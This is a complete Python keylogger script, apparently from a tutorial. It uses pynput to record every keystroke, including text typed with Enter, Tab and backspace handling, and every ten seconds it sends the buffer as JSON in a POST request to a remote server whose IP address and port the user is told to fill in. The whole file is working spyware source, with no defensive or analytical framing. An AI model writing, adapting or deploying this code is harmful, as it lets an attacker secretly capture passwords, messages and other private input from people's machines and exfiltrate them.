#  pip install pynput

from pynput import keyboard

import requests

import json

import threading

# global variable text which we'll send to a remote server.
text = ""

#  your server ip address & port 
ip_address = "192.168.43.19"
port_number = "8080"

# Time for code to execute.
time_interval = 10

def send_post_req():
    try:
        # Python object into a JSON string
        payload = json.dumps({"keyboardData" : text})
        
        # POST Request to the server with ip address 
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        
        # Setting up a timer function to run every time interval
        timer = threading.Timer(time_interval, send_post_req)
        
        # start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # explicit conversion from the key object to a string 
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()

        
